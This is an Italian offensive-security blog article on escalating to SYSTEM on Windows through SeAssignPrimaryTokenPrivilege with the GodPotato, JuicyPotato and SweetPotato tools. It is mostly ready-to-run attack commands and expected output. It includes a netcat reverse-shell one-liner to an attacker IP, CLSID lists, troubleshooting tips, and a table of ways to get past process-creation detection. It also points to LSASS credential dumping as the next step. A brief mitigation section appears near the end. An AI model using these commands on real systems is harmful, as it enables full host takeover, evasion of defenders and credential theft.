---
title: >-
  SeAssignPrimaryTokenPrivilege: il bypass ai Potato Attack anche senza
  SeImpersonatePrivilege
slug: seassignprimarytokenprivilege
description: >-
  Privilege escalation con SeAssignPrimaryTokenPrivilege e al bypass dei Potato
  Attack su Windows: verifica del privilegio, exploit con GodPotato, JuicyPotato
  e SweetPotato, scenari reali, errori comuni e mitigazioni.
image: /seassignprimarytokenprivilege.webp
draft: false
date: 2026-05-22T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - SeAssignPrimaryTokenPrivilege
  - potato attacks
---

Un admin ha rimosso SeImpersonatePrivilege credendo di aver bloccato i Potato attack. SeAssignPrimaryTokenPrivilege è rimasto intatto — e GodPotato lo usa automaticamente. Stesso risultato, stessi due comandi.

***

## Quick Exploit

```cmd
whoami /priv
GodPotato.exe -cmd "cmd /c whoami"
```

Output atteso:

```
[+] CreateProcessAsUser OK       ← usa SeAssignPrimaryTokenPrivilege
nt authority\system
```

***

## Cos'è SeAssignPrimaryTokenPrivilege

Dove SeImpersonatePrivilege impersona un token nel thread corrente (scope temporaneo), questo privilegio permette di assegnare un token primario a un processo figlio tramite `CreateProcessAsUser()` prima che venga avviato (scope permanente). Il risultato finale è identico: un processo che gira come SYSTEM. I Potato attack supportano entrambi i percorsi API — se uno manca, usano l'altro automaticamente.

**Nota:** Appare quasi sempre come `Disabled` in `whoami /priv`. Non è un blocco — GodPotato e JuicyPotato lo abilitano automaticamente via `AdjustTokenPrivileges`.

***

## Quando esiste

Compare quasi sempre insieme a SeImpersonatePrivilege, stessa famiglia di account:

* **IIS Application Pool** — per design
* **SQL Server** — `NT SERVICE\MSSQLSERVER`
* **Veeam / Acronis / Exchange** — service account di backup e gestione
* **Ambienti con hardening parziale** — SeImpersonatePrivilege rimosso, questo dimenticato

Verifica:

```cmd
whoami /priv
```

Output tipico:

```
SeAssignPrimaryTokenPrivilege    Replace a process level token    Disabled
SeImpersonatePrivilege           Impersonate a client...          Enabled
```

Chi ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeAssignPrimaryTokenPrivilege *
```

Con Seatbelt per i dettagli completi:

```cmd
Seatbelt.exe TokenPrivileges
```

***

## Step 1 — Exploit con GodPotato

GodPotato gestisce entrambi i percorsi API automaticamente: prova prima `CreateProcessWithTokenW` (SeImpersonatePrivilege), e se fallisce usa `CreateProcessAsUser` (SeAssignPrimaryTokenPrivilege). Non devi configurare nulla.

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

Output atteso — nota quale path API viene usato:

```
[*] TargetMethod: IRemUnknown2
[+] Trigger RPCSS
[*] SYSTEM token captured
[+] CreateProcessAsUser OK       ← usa SeAssignPrimaryTokenPrivilege
nt authority\system
```

Reverse shell:

```cmd
GodPotato.exe -cmd "C:\tools\nc.exe 10.10.14.1 4444 -e cmd"
```

***

## Varianti

### JuicyPotato con `-t 2` — forza CreateProcessAsUser

Quando hai **solo** SeAssignPrimaryTokenPrivilege (SeImpersonatePrivilege rimosso), puoi forzare esplicitamente il path con il flag `-t 2`:

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t 2 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Il flag `-t` controlla il path API:

* `-t 1` → `CreateProcessWithTokenW` → richiede SeImpersonatePrivilege
* `-t 2` → `CreateProcessAsUser` → richiede SeAssignPrimaryTokenPrivilege
* `-t *` → prova entrambi in sequenza (scelta giusta nella maggior parte dei casi)

CLSID comuni da provare in ordine:

* `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` — BITS
* `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}` — Print Spooler
* `{4991D34B-80A1-4291-83B6-3328366B9097}` — WUAUSERV

Lista completa per versione OS: [ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Se un CLSID produce un processo che non è SYSTEM, cambia CLSID — non il tool.

### SweetPotato — gestisce entrambi i percorsi API

SweetPotato prova vettori multipli e usa automaticamente il path disponibile tra i due:

```cmd
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

### Abilitare manualmente il privilegio per script custom

Se usi script PowerShell con API .NET dirette invece di GodPotato o robocopy:

```powershell
Import-Module .\Enable-Privilege.ps1
Enable-Privilege SeAssignPrimaryTokenPrivilege
```

Verifica che sia passato a Enabled:

```cmd
whoami /priv | findstr SeAssign
```

***

## Attack Chain

```
SeImpersonatePrivilege rimosso dall'admin (hardening parziale)
  → whoami /priv → SeAssignPrimaryTokenPrivilege presente (spesso Disabled)
  → GodPotato.exe → fallback automatico su CreateProcessAsUser
  → nt authority\system
```

***

## Tool Decision

| Situazione                                      | Tool / flag                                              |
| ----------------------------------------------- | -------------------------------------------------------- |
| Caso generale                                   | **GodPotato** — gestisce entrambi i path automaticamente |
| Solo SeAssignPrimaryTokenPrivilege, JuicyPotato | **`-t 2`** per forzare `CreateProcessAsUser`             |
| Multi-trigger / EDR                             | **SweetPotato** — gestisce entrambi i percorsi API       |

***

## Scenari reali

**Hardening parziale** — l'admin rimuove SeImpersonatePrivilege dal service account IIS dopo un audit. SeAssignPrimaryTokenPrivilege rimane perché non era nella checklist. GodPotato usa il path `CreateProcessAsUser` automaticamente → SYSTEM.

**SQL Server con Print Spooler disabilitato** — PrintSpoofer non funziona. GodPotato usa SeAssignPrimaryTokenPrivilege tramite RPC → SYSTEM senza dipendere dallo Spooler.

**Veeam service account** — entrambi i privilegi presenti per default. La chain funziona con qualsiasi Potato tool.

***

## Errori comuni

**JuicyPotato `-t 2` lancia il processo ma non è SYSTEM** — CLSID sbagliato per la versione OS. Cambia CLSID dalla lista: [ohpe/juicy-potato/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID). CLSID da provare in ordine: `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` → `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}` → `{4991D34B-80A1-4291-83B6-3328366B9097}`.

**Privilegio Disabled e script custom fallisce** — Il tuo script non chiama `AdjustTokenPrivileges`. Usa GodPotato o SweetPotato che lo gestiscono automaticamente, oppure aggiungi `Enable-Privilege SeAssignPrimaryTokenPrivilege` prima del codice custom.

**DCOM completamente disabilitato** — Raro ma possibile in ambienti molto hardened. Prova SweetPotato con vettore EfsRpc che non dipende da DCOM.

***

## Quando fallisce

* **JuicyPotato `-t 2` con CLSID sbagliato** → processo parte ma non è SYSTEM. Cambia CLSID dalla lista per la versione OS target.
* **DCOM completamente disabilitato** → raro in produzione. Prova SweetPotato con vettore EfsRpc.
* **Entrambi i privilegi rimossi** → i Potato attack non funzionano. Cerca altri vettori.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                     | Come lo bypassa il Red Team                                                                           |
| -------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| Event ID 4688 — processi figli anomali       | Usa payload in-memory, evita di spawnare `cmd.exe` direttamente                                       |
| Sysmon Event ID 1 — catena processi inusuale | Aggiungi un processo intermedio legittimo tra il servizio e il payload                                |
| Audit Process Creation attivo                | Spesso non abilitato su sistemi legacy — verifica con `auditpol /get /subcategory:"Process Creation"` |

***

## Mitigazioni

Rimuovere **entrambi** i privilegi dagli account di servizio. Uno solo rimasto è sufficiente.

```cmd
accesschk.exe -a SeAssignPrimaryTokenPrivilege *
accesschk.exe -a SeImpersonatePrivilege *
```

Rimuovili da `secpol.msc` → User Rights Assignment. Usa **gMSA** per i servizi AD.

**Nota realistica:** La maggior parte degli admin rimuove solo SeImpersonatePrivilege dopo aver letto una checklist di hardening. SeAssignPrimaryTokenPrivilege viene sistematicamente ignorato — è uno dei bypass più facili nei pentest post-hardening.

***

## FAQ

**GodPotato sceglie automaticamente il path giusto?**
Sì — prova prima SeImpersonatePrivilege, poi fallback su SeAssignPrimaryTokenPrivilege. Non devi configurare nulla.

**È più difficile da sfruttare di SeImpersonatePrivilege?**
No — con GodPotato è identico. La distinzione tecnica è gestita dal tool.

***

Rimuovere SeImpersonatePrivilege senza togliere SeAssignPrimaryTokenPrivilege non mitiga niente — i Potato attack funzionano comunque. Se sei post-SYSTEM, il passo successivo è il dump credenziali con [SeDebugPrivilege](http://hackita.it/articoli/sedebugprivilege).

***

**Articoli correlati:**

* [SeImpersonatePrivilege](http://hackita.it/articoli/seimpersonateprivilege) — guida completa ai Potato attack
* [SeDebugPrivilege](http://hackita.it/articoli/sedebugprivilegesedebugprivilege) — dump LSASS dopo SYSTEM
* [SeCreateTokenPrivilege](http://hackita.it/articoli/secreatetokenprivilege) — token forgery senza dipendenze esterne

**Riferimenti:** [GodPotato](https://github.com/BeichenDream/GodPotato) · [JuicyPotato CLSID list](https://github.com/ohpe/juicy-potato/tree/master/CLSID) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/replace-a-process-level-token)
